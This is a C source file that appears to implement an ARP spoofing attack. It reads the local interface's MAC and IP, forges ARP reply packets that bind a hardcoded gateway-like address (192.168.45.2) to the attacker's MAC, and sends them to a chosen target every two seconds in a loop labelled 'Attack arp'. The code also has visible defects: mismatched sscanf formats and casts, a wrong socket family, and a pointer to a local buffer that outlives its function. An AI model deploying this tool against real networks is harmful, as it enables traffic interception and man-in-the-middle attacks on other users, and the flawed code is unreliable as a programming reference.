#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <errno.h>

#include "arp_spoof.h"

#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)

void getLocalAddress(char *name, struct getlocal *gl) {
  struct ifreq ifr= {0,};
  int sock,i; 
  char mac[19];
  char ip[INET6_ADDRSTRLEN] = {0,};
  FILE *fp;  
  
  sock=socket(AF_INET,SOCK_DGRAM,0);

  if (sock < 0) {
    perror("ERROR opening socket\n");
    exit(1);
  } 

  strncpy(ifr.ifr_name,name,sizeof(ifr.ifr_name));
  ifr.ifr_addr.sa_family = AF_INET; 

  if (ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0) { 
    perror("ERROR opening ioctl mac\n");
    exit(0);
  }

  sprintf(mac, " %02x:%02x:%02x:%02x:%02x:%02x", 
    (unsigned char)ifr.ifr_hwaddr.sa_data[0],
    (unsigned char)ifr.ifr_hwaddr.sa_data[1],
    (unsigned char)ifr.ifr_hwaddr.sa_data[2],
    (unsigned char)ifr.ifr_hwaddr.sa_data[3],
    (unsigned char)ifr.ifr_hwaddr.sa_data[4],
    (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

  memcpy(gl->mac, mac,sizeof(mac));


  /*if (ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0) { 
    perror("ERROR opening ioctl ip\n");
    return -1;
  }


    if (inet_ntop(AF_INET, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, ip, sizeof ip) == NULL) //vracia adresu interf
    {
      perror("inet_ntop");
      return 0;
    }
    //printf("%x\n",inet_ntoa((((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr)));
    printf("func ip : \t %s\n",ip);
    gl->ip = ip;
*/
  fp = popen(" /bin/bash -c \"ifconfig eth0\" | grep \'inet \' | awk \'{ print $2}\'", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
  }

  
  while (fgets(ip, sizeof(ip)-1, fp) != NULL) {
    ;
  }
  for( i =0; i<sizeof(ip);i++)
  {
    if(ip[i]=='\n')
      ip[i]='\0';    
  } 
  
  gl->ip=ip;

  printf("get Local \t<Ip> : %s \t <Mac> : %s\n", ip, mac);

  pclose(fp);

  close(sock);  
}


void arp_spoof(int sknum, struct getlocal * gl, char* interface, char* target_ip, char *target_mac)
{


  char packet[PACKET_LEN];
  struct sockaddr_ll send_arp;
  struct ether_header * eth = (struct ether_header *) packet;
  struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));

  printf("input Value \t <interface> : %s \t <ip> : %s \t <mac> : %s \n",interface,target_ip,target_mac);
  //Destination Hardware Address : ARP Packet 

  sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  (u_int8_t *) &arp->arp_tha[0],
    (u_int8_t *) &arp->arp_tha[1],
    (u_int8_t *) &arp->arp_tha[2],
    (u_int8_t *) &arp->arp_tha[3],
    (u_int8_t *) &arp->arp_tha[4],
    (u_int8_t *) &arp->arp_tha[5]);

  //Debug
  printf("%x  \n",arp->arp_tha);
  printf("%02x : %02x : %02x : %02x : %02x \n",arp->arp_tha[0],arp->arp_tha[1],arp->arp_tha[2],arp->arp_tha[3],arp->arp_tha[4],arp->arp_tha[5]);

 
  //Destination Protocol Address : ARP Packet
  sscanf(target_ip, "%d.%d.%d.%d", (int *) &arp->arp_tpa[0],
   (u_int8_t *) &arp->arp_tpa[1],
   (u_int8_t *) &arp->arp_tpa[2],
   (u_int8_t *) &arp->arp_tpa[3]);


  //Source Hardware Address : ARP Packet
  sscanf(gl->mac, "%x:%x:%x:%x:%x:%x",  (u_int8_t *) &arp->arp_sha[0],
    (u_int8_t *) &arp->arp_sha[1],
    (u_int8_t *) &arp->arp_sha[2],
    (u_int8_t *) &arp->arp_sha[3],
    (u_int8_t *) &arp->arp_sha[4],
    (u_int8_t *) &arp->arp_sha[5]);

 

  //Source Protocol Address : ARP Packet
  sscanf("192.168.45.2", "%d.%d.%d.%d", (u_int8_t *) &arp->arp_spa[0],
   (u_int8_t *) &arp->arp_spa[1],
   (u_int8_t *) &arp->arp_spa[2],
   (u_int8_t *) &arp->arp_spa[3]);

 // printf("4: %p\n",arp->arp_spa);
  //Ethernet Packet
  
   memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);    //destination address 
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);    //source address
   eth->ether_type = htons(ETH_P_ARP);                  //type

    printf("Eth |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", arp->arp_tha[0] , arp->arp_tha[1] , arp->arp_tha[2] , arp->arp_tha[3] , arp->arp_tha[4] , arp->arp_tha[5] );
    printf("Eth |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->ether_shost[0] , eth->ether_shost[1] , eth->ether_shost[2] , eth->ether_shost[3] , eth->ether_shost[4] , eth->ether_shost[5] );   


  //ARP Packet
   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
   arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
   arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
   arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
   arp->ea_hdr.ar_op = htons(ARPOP_REPLY);              //ARP operation : REPLY
   //memset(arp->arp_tha, 0xff, ETH_ALEN);              //Target hardware address.
   //memset(arp->arp_tpa, 0x00, 4);                     //Target protocol address.


   memset(&send_arp, 0, sizeof(send_arp));
   send_arp.sll_ifindex = if_nametoindex(interface);  //Interface number 


   if (send_arp.sll_ifindex == 0)
   {
     printf("if_nametoindex() failed with errno =  %d %s \n",
      errno,strerror(errno));
     return;
   }

//send_arp.sll_family = AF_PACKET;
   send_arp.sll_family = AF_INET;     
   memcpy(send_arp.sll_addr, arp->arp_sha, ETH_ALEN); //Physical layer address
   send_arp.sll_halen = htons(ETH_ALEN);    //Length of address

   printf("Press Ctrl+C to stop \n");
   while (1) {
     printf("Attack arp %s: %s is at %s\n", interface, target_ip, target_mac );
     sendto(sknum, packet, PACKET_LEN, 0, (struct sockaddr *) &send_arp, sizeof(send_arp));
     sleep(2);
   }
 }










